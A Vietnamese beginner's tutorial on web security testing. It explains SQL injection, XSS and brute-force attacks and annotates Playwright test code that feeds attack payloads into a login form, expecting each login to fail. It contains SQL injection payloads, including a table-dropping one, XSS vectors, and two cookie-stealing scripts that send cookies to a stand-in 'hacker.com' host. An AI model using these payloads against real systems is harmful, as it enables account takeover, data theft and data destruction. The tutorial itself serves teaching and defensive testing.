# HƯỚNG DẪN CHI TIẾT VỀ SECURITY TESTING

## Dành cho người mới bắt đầu

---

## MỤC LỤC

1. [Tại sao cần Security Testing?](#1-tại-sao-cần-security-testing)
2. [SQL Injection là gì?](#2-sql-injection-là-gì)
3. [XSS Attack là gì?](#3-xss-attack-là-gì)
4. [Brute Force Attack là gì?](#4-brute-force-attack-là-gì)
5. [Giải thích chi tiết từng dòng code](#5-giải-thích-chi-tiết-từng-dòng-code)
6. [Ví dụ thực tế](#6-ví-dụ-thực-tế)

---

## 1. TẠI SAO CẦN SECURITY TESTING?

### 1.1. Hình dung đơn giản

Hãy tưởng tượng form đăng nhập như **cửa nhà bạn**:

```
┌─────────────────────────────────────┐
│         FORM ĐĂNG NHẬP              │
│  ┌─────────────────────────────┐    │
│  │ Username: [_______________] │    │  <-- Ô nhập liệu = Cửa vào
│  └─────────────────────────────┘    │
│  ┌─────────────────────────────┐    │
│  │ Password: [_______________] │    │  <-- Ô nhập liệu = Cửa vào
│  └─────────────────────────────┘    │
│         [  ĐĂNG NHẬP  ]             │
└─────────────────────────────────────┘
```

**Nếu không kiểm tra bảo mật:**
- Kẻ xấu có thể nhập "mã độc" vào ô username/password
- Mã độc này có thể: đánh cắp dữ liệu, xóa database, chiếm quyền admin

**Security Testing = Kiểm tra xem "cửa nhà" có chắc chắn không**

### 1.2. Hậu quả thực tế nếu không test bảo mật

| Loại tấn công | Hậu quả |
|---------------|---------|
| SQL Injection | Hacker đọc được TẤT CẢ mật khẩu người dùng |
| SQL Injection | Hacker XÓA toàn bộ database |
| XSS Attack | Hacker đánh cắp cookie, session của người dùng |
| XSS Attack | Hacker điều hướng người dùng đến trang lừa đảo |
| Brute Force | Hacker thử hàng triệu mật khẩu để đăng nhập |

### 1.3. Các vụ hack nổi tiếng do lỗi bảo mật

- **2012 - LinkedIn**: 6.5 triệu mật khẩu bị lộ (SQL Injection)
- **2014 - Sony Pictures**: Toàn bộ dữ liệu bị xóa
- **2017 - Equifax**: 147 triệu thông tin người dùng bị đánh cắp

---

## 2. SQL INJECTION LÀ GÌ?

### 2.1. SQL là gì? (Giải thích cơ bản)

**SQL** = Ngôn ngữ để "nói chuyện" với Database (cơ sở dữ liệu)

Khi bạn đăng nhập, hệ thống chạy lệnh SQL như sau:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '123456'
```

**Giải thích từng phần:**
```
SELECT *           -- Lấy tất cả thông tin
FROM users         -- Từ bảng "users" (chứa danh sách người dùng)
WHERE              -- Với điều kiện:
username = 'admin' -- username phải bằng 'admin'
AND                -- VÀ
password = '123456' -- password phải bằng '123456'
```

### 2.2. SQL Injection hoạt động như thế nào?

**Bình thường:**
```
Người dùng nhập: admin
Hệ thống tạo SQL: SELECT * FROM users WHERE username = 'admin'
                                                        ↑
                                              Giá trị người dùng nhập
```

**Khi bị tấn công SQL Injection:**
```
Hacker nhập: ' OR '1'='1
Hệ thống tạo SQL: SELECT * FROM users WHERE username = '' OR '1'='1'
                                                        ↑
                                              Mã độc của hacker!
```

### 2.3. Phân tích payload `' OR '1'='1`

```
Payload: ' OR '1'='1

Chia nhỏ ra:
'        -- Đóng dấu nháy của username
OR       -- Thêm điều kiện "HOẶC"
'1'='1'  -- Điều kiện LUÔN ĐÚNG (1 luôn bằng 1)
```

**Kết quả:**
```sql
-- SQL gốc:
SELECT * FROM users WHERE username = 'admin' AND password = '123456'

-- SQL sau khi bị injection:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
                                          ↑
                                    LUÔN ĐÚNG!

-- Vì '1'='1' luôn đúng, hacker có thể đăng nhập mà KHÔNG CẦN MẬT KHẨU!
```

### 2.4. Các loại SQL Injection payload

| Payload | Mục đích | Giải thích |
|---------|----------|------------|
| `' OR '1'='1` | Bypass đăng nhập | Tạo điều kiện luôn đúng |
| `admin'--` | Bỏ qua password | `--` là comment, bỏ qua phần sau |
| `'; DROP TABLE users;--` | XÓA BẢNG USERS | Xóa toàn bộ người dùng! |
| `' UNION SELECT * FROM users--` | Đọc dữ liệu | Lấy tất cả thông tin users |

### 2.5. Minh họa bằng hình

```
ĐĂNG NHẬP BÌNH THƯỜNG:
┌──────────────────┐      ┌──────────────┐      ┌──────────────┐
│  Username: admin │ ---> │   Kiểm tra   │ ---> │ Cho phép vào │
│  Password: 12345 │      │   Database   │      │   nếu đúng   │
└──────────────────┘      └──────────────┘      └──────────────┘

SQL INJECTION:
┌───────────────────────┐      ┌──────────────┐      ┌──────────────┐
│ Username: ' OR '1'='1 │ ---> │   Kiểm tra   │ ---> │  VÀO LUÔN!   │
│ Password: (bất kỳ)    │      │   Database   │      │ Không cần MK │
└───────────────────────┘      └──────────────┘      └──────────────┘
                                     ↑
                           Điều kiện bị thay đổi
                           thành LUÔN ĐÚNG
```

---

## 3. XSS ATTACK LÀ GÌ?

### 3.1. XSS = Cross-Site Scripting

**XSS** = Hacker chèn mã JavaScript độc hại vào trang web

### 3.2. JavaScript là gì?

JavaScript là ngôn ngữ chạy trên trình duyệt, có thể:
- Thay đổi nội dung trang web
- Đọc cookie (chứa thông tin đăng nhập)
- Điều hướng người dùng đến trang khác
- Gửi dữ liệu đến server của hacker

### 3.3. XSS hoạt động như thế nào?

**Bình thường:**
```
Người dùng nhập username: John
Trang web hiển thị: Xin chào, John!
```

**Khi bị XSS Attack:**
```
Hacker nhập username: <script>alert('Bị hack!')</script>
Trang web hiển thị: Xin chào, <script>alert('Bị hack!')</script>!
                              ↑
                    Trình duyệt CHẠY code này!
                    Hiện hộp thoại "Bị hack!"
```

### 3.4. Các loại XSS payload

| Payload | Giải thích |
|---------|------------|
| `<script>alert('XSS')</script>` | Chèn thẻ script, chạy JavaScript |
| `<img src=x onerror=alert('XSS')>` | Chèn hình lỗi, khi lỗi thì chạy JS |
| `<svg onload=alert('XSS')>` | Chèn SVG, khi load thì chạy JS |

### 3.5. Ví dụ nguy hiểm thực tế

```javascript
// Hacker có thể chèn code này:
<script>
  // Đánh cắp cookie (chứa session đăng nhập)
  var cookie = document.cookie;

  // Gửi về server của hacker
  new Image().src = "http://hacker.com/steal?cookie=" + cookie;
</script>
```

**Hậu quả:** Hacker có cookie của bạn = Hacker đăng nhập được vào tài khoản của bạn!

### 3.6. Minh họa bằng hình

```
XSS ATTACK:

1. Hacker chèn mã độc vào form:
   ┌─────────────────────────────────────┐
   │ Username: <script>steal()</script>  │
   └─────────────────────────────────────┘
                    │
                    ▼
2. Server lưu vào database
                    │
                    ▼
3. Người dùng khác xem trang:
   ┌─────────────────────────────────────┐
   │ Xin chào, <script>steal()</script>  │
   └─────────────────────────────────────┘
                    │
                    ▼
4. Trình duyệt nạn nhân CHẠY mã độc!
   Cookie bị đánh cắp và gửi cho hacker!
```

---

## 4. BRUTE FORCE ATTACK LÀ GÌ?

### 4.1. Định nghĩa đơn giản

**Brute Force** = Thử TẤT CẢ mật khẩu có thể cho đến khi đúng

### 4.2. Ví dụ

```
Hacker thử:
Lần 1: password = "123456"     --> Sai
Lần 2: password = "password"   --> Sai
Lần 3: password = "admin123"   --> Sai
Lần 4: password = "qwerty"     --> Sai
...
Lần 10000: password = "MyP@ss" --> ĐÚNG! Vào được!
```

### 4.3. Tại sao nguy hiểm?

- Máy tính có thể thử **hàng triệu** mật khẩu mỗi giây
- Nếu không có bảo vệ, mật khẩu yếu sẽ bị crack rất nhanh

### 4.4. Cách bảo vệ

| Biện pháp | Mô tả |
|-----------|-------|
| Khóa tài khoản sau 5 lần sai | Hacker không thể thử tiếp |
| CAPTCHA | Yêu cầu nhập mã xác nhận |
| Delay tăng dần | Mỗi lần sai, đợi lâu hơn |
| 2FA (Xác thực 2 bước) | Cần thêm mã từ điện thoại |

---

## 5. GIẢI THÍCH CHI TIẾT TỪNG DÒNG CODE

### 5.1. File test-data.ts - Dữ liệu test

```typescript
// ============================================================
// Dòng 70-77: SQL INJECTION PAYLOADS
// ============================================================

export const sqlInjection = [
  // Mỗi object chứa: payload (mã tấn công) và description (mô tả)

  { payload: "' OR '1'='1", description: 'Basic SQL injection' },
  // ↑ Payload cơ bản nhất
  // Mục đích: Tạo điều kiện luôn đúng để bypass đăng nhập

  { payload: "admin'--", description: 'Comment injection' },
  // ↑ Dấu -- là comment trong SQL
  // Mục đích: Bỏ qua phần kiểm tra password
  // SQL trở thành: WHERE username = 'admin'-- (phần sau bị bỏ qua)

  { payload: "' OR '1'='1'--", description: 'SQL injection with comment' },
  // ↑ Kết hợp cả hai kỹ thuật trên

  { payload: "'; DROP TABLE users;--", description: 'Destructive SQL' },
  // ↑ NGUY HIỂM NHẤT!
  // Mục đích: XÓA TOÀN BỘ BẢNG USERS
  // DROP TABLE = Xóa bảng

  { payload: "' UNION SELECT * FROM users--", description: 'Union injection' }
  // ↑ UNION = Gộp kết quả
  // Mục đích: Đọc tất cả dữ liệu từ bảng users
];
```

```typescript
// ============================================================
// Dòng 79-86: XSS ATTACK PAYLOADS
// ============================================================

export const xssPayloads = [
  { payload: "<script>alert('XSS')</script>", description: 'Basic XSS' },
  // ↑ Chèn thẻ <script>
  // Nếu trang web không escape, trình duyệt sẽ chạy alert()
  // alert() = Hiện hộp thoại popup

  { payload: "<img src=x onerror=alert('XSS')>", description: 'Image XSS' },
  // ↑ Chèn thẻ <img> với src không tồn tại (x)
  // Khi hình lỗi (onerror), chạy alert()
  // Kỹ thuật này bypass được một số filter

  { payload: "<svg onload=alert('XSS')>", description: 'SVG XSS' },
  // ↑ Chèn thẻ <svg>
  // Khi SVG load xong (onload), chạy alert()

  { payload: "javascript:alert('XSS')", description: 'JavaScript protocol' },
  // ↑ Sử dụng protocol javascript:
  // Nếu được đặt trong href, sẽ chạy code

  { payload: "<body onload=alert('XSS')>", description: 'Body onload XSS' }
  // ↑ Chèn thẻ <body> mới
  // Khi body load, chạy alert()
];
```

### 5.2. File security.spec.ts - Code test bảo mật

```typescript
// ============================================================
// DÒNG 1-9: IMPORT CÁC THƯ VIỆN CẦN THIẾT
// ============================================================

import { test, expect } from '@playwright/test';
// ↑ Import từ Playwright:
// - test: Hàm để định nghĩa test case
// - expect: Hàm để kiểm tra kết quả

import { LoginPage } from './pages/login.page';
// ↑ Import LoginPage class
// Chứa các phương thức: login(), isLoggedIn(), isErrorVisible()...

import { sqlInjection, xssPayloads, bruteForce } from './data/test-data';
// ↑ Import dữ liệu test:
// - sqlInjection: Mảng các SQL injection payload
// - xssPayloads: Mảng các XSS payload
// - bruteForce: Dữ liệu test brute force
```

```typescript
// ============================================================
// DÒNG 11-20: SETUP TEST
// ============================================================

test.describe('Security Tests', () => {
  // ↑ test.describe = Nhóm các test liên quan lại
  // 'Security Tests' = Tên của nhóm test

  let loginPage: LoginPage;
  // ↑ Khai báo biến loginPage
  // Kiểu: LoginPage (class ta đã tạo)

  test.beforeEach(async ({ page }) => {
    // ↑ beforeEach = Chạy TRƯỚC MỖI test case
    // { page } = Đối tượng trang web từ Playwright

    loginPage = new LoginPage(page);
    // ↑ Tạo instance mới của LoginPage
    // Truyền page vào để LoginPage có thể tương tác với trình duyệt

    await loginPage.goto();
    // ↑ Mở trang web
    // await = Đợi cho đến khi trang load xong
  });
```

```typescript
// ============================================================
// DÒNG 22-42: TEST SQL INJECTION TRÊN USERNAME
// ============================================================

test.describe('SQL Injection Tests - Username Field', () => {
  // ↑ Nhóm test SQL Injection cho ô username

  for (const injection of sqlInjection) {
    // ↑ Vòng lặp: Với MỖI payload trong mảng sqlInjection
    // injection = { payload: "' OR '1'='1", description: "Basic SQL injection" }

    test(`SEC-SQL-U: ${injection.description}`, async ({ page }) => {
      // ↑ Tạo test case với tên động
      // Ví dụ: "SEC-SQL-U: Basic SQL injection"

      await loginPage.login(injection.payload, 'anypassword');
      // ↑ Thử đăng nhập với:
      // - Username = payload (mã tấn công)
      // - Password = 'anypassword' (bất kỳ)

      // Kỳ vọng: KHÔNG đăng nhập được
      const isLoggedIn = await loginPage.isLoggedIn();
      // ↑ Kiểm tra xem có đăng nhập thành công không

      expect(isLoggedIn).toBeFalsy();
      // ↑ Mong đợi: isLoggedIn = false
      // toBeFalsy() = Phải là false/null/undefined
      // Nếu isLoggedIn = true → TEST FAIL → Có lỗ hổng bảo mật!
    });
  }
});
```

```typescript
// ============================================================
// GIẢI THÍCH CHI TIẾT: TẠI SAO DÙNG VÒNG LẶP?
// ============================================================

// Thay vì viết 5 test riêng biệt:
test('Test 1', async () => { /* test với payload 1 */ });
test('Test 2', async () => { /* test với payload 2 */ });
test('Test 3', async () => { /* test với payload 3 */ });
test('Test 4', async () => { /* test với payload 4 */ });
test('Test 5', async () => { /* test với payload 5 */ });

// Ta dùng vòng lặp để tự động tạo 5 test:
for (const injection of sqlInjection) {
  test(`Test: ${injection.description}`, async () => {
    // Code test giống nhau, chỉ khác payload
  });
}

// Lợi ích:
// 1. Code ngắn gọn hơn
// 2. Dễ thêm payload mới (chỉ cần thêm vào mảng)
// 3. Đảm bảo logic test nhất quán
```

```typescript
// ============================================================
// DÒNG 80-100: TEST BRUTE FORCE
// ============================================================

test('Brute force protection', async ({ page }) => {
  // ↑ Test kiểm tra bảo vệ brute force

  const maxAttempts = bruteForce.maxAttempts;
  // ↑ Lấy số lần thử tối đa (ví dụ: 5)

  // Thử đăng nhập sai nhiều lần
  for (let i = 0; i < maxAttempts; i++) {
    // ↑ Lặp từ 0 đến maxAttempts-1 (tức 5 lần)

    await loginPage.login(
      bruteForce.username,           // Username cố định
      bruteForce.wrongPasswords[i]   // Password sai lần lượt
    );
    // Lần 1: password = 'wrong1'
    // Lần 2: password = 'wrong2'
    // ...
    // Lần 5: password = 'wrong5'
  }

  // Sau 5 lần sai, kiểm tra xem có bảo vệ không
  const isFormVisible = await loginPage.isLoginFormVisible();
  const isError = await loginPage.isErrorVisible();

  // Mong đợi: Form vẫn hiện HOẶC có thông báo lỗi
  // (Không bị crash, có xử lý brute force)
  expect(isFormVisible || isError).toBeTruthy();
});
```

### 5.3. Giải thích các hàm trong LoginPage

```typescript
// ============================================================
// HÀM login() - Thực hiện đăng nhập
// ============================================================

async login(username: string, password: string) {
  // async = Hàm bất đồng bộ (cần await khi gọi)
  // username: string = Tham số username, kiểu chuỗi
  // password: string = Tham số password, kiểu chuỗi

  await this.confirmCountry();
  // ↑ Bước 1: Click nút "Confirm My Country" nếu có popup

  await this.clickSignIn();
  // ↑ Bước 2: Click nút "Sign In" để mở form login

  await this.fillUsername(username);
  // ↑ Bước 3: Điền username vào ô input

  await this.fillPassword(password);
  // ↑ Bước 4: Điền password vào ô input

  await this.clickLoginButton();
  // ↑ Bước 5: Click nút "Login"

  await this.page.waitForLoadState('networkidle');
  // ↑ Bước 6: Đợi trang load xong
  // 'networkidle' = Không còn request nào đang chạy
}
```

```typescript
// ============================================================
// HÀM isLoggedIn() - Kiểm tra đã đăng nhập chưa
// ============================================================

async isLoggedIn(): Promise<boolean> {
  // Promise<boolean> = Trả về true hoặc false

  try {
    // try = Thử thực hiện code bên trong

    await this.dashboardLink.waitFor({ state: 'visible', timeout: 10000 });
    // ↑ Đợi tối đa 10 giây để thấy link "Dashboard"
    // Nếu thấy Dashboard = Đã đăng nhập thành công

    return true;
    // ↑ Trả về true = Đã đăng nhập

  } catch {
    // catch = Nếu có lỗi (không thấy Dashboard)

    return false;
    // ↑ Trả về false = Chưa đăng nhập
  }
}
```

---

## 6. VÍ DỤ THỰC TẾ

### 6.1. Kịch bản tấn công SQL Injection

```
BƯỚC 1: Hacker vào trang đăng nhập
        https://example.com/login

BƯỚC 2: Hacker nhập vào ô Username:
        ' OR '1'='1'--

BƯỚC 3: Hacker nhập Password bất kỳ:
        abc123

BƯỚC 4: Server nhận được và tạo SQL:
        SELECT * FROM users
        WHERE username = '' OR '1'='1'--'
        AND password = 'abc123'

        Phần sau -- bị bỏ qua, SQL thực sự là:
        SELECT * FROM users WHERE username = '' OR '1'='1'

        Điều kiện '1'='1' LUÔN ĐÚNG!

BƯỚC 5: Server trả về user đầu tiên trong database
        (thường là admin!)

BƯỚC 6: Hacker đăng nhập thành công với quyền ADMIN
        mà KHÔNG CẦN BIẾT MẬT KHẨU!
```

### 6.2. Kịch bản tấn công XSS

```
BƯỚC 1: Hacker đăng ký tài khoản với tên:
        <script>document.location='http://hacker.com/steal?c='+document.cookie</script>

BƯỚC 2: Tên này được lưu vào database

BƯỚC 3: Admin vào trang quản lý, xem danh sách users

BƯỚC 4: Trang hiển thị:
        "Người dùng mới: <script>document.location=...</script>"

BƯỚC 5: Trình duyệt của Admin CHẠY đoạn script

BƯỚC 6: Cookie của Admin bị gửi đến http://hacker.com

BƯỚC 7: Hacker dùng cookie để đăng nhập với quyền ADMIN
```

### 6.3. Tại sao test của chúng ta quan trọng?

```
KHI CHẠY TEST:

1. Test thử nhập: ' OR '1'='1
2. Nếu đăng nhập được (isLoggedIn = true)
   → TEST FAIL
   → Website có lỗ hổng SQL Injection!
   → Developer phải fix ngay!

3. Nếu không đăng nhập được (isLoggedIn = false)
   → TEST PASS
   → Website đã được bảo vệ!
```

---

## 7. TÓM TẮT

| Loại tấn công | Mục đích | Cách test |
|---------------|----------|-----------|
| SQL Injection | Bypass đăng nhập, đọc/xóa database | Nhập payload SQL vào form, kiểm tra không đăng nhập được |
| XSS | Chạy JavaScript độc, đánh cắp cookie | Nhập payload JS vào form, kiểm tra không bị thực thi |
| Brute Force | Thử nhiều mật khẩu | Thử sai nhiều lần, kiểm tra có bị khóa không |

### Công thức nhớ:

```
SECURITY TEST = THỬ TẤN CÔNG + KIỂM TRA THẤT BẠI

Nếu tấn công THÀNH CÔNG → Website có LỖ HỔNG → Cần FIX
Nếu tấn công THẤT BẠI → Website AN TOÀN → PASS
```

---

## 8. CÂU HỎI THƯỜNG GẶP

### Q: Tại sao không test thật trên website thật?
**A:** Tấn công website thật mà không có phép là BẤT HỢP PHÁP. Chúng ta chỉ test trên website của mình hoặc được cho phép.

### Q: Làm sao để bảo vệ khỏi SQL Injection?
**A:** Sử dụng:
- Prepared Statements (Câu lệnh chuẩn bị sẵn)
- Parameterized Queries (Truy vấn có tham số)
- Input Validation (Kiểm tra đầu vào)

### Q: Làm sao để bảo vệ khỏi XSS?
**A:** Sử dụng:
- HTML Escaping (Chuyển đổi ký tự đặc biệt)
- Content Security Policy (CSP)
- Input Sanitization (Làm sạch đầu vào)

---

*Tài liệu được viết cho người mới bắt đầu học về bảo mật ứng dụng web*
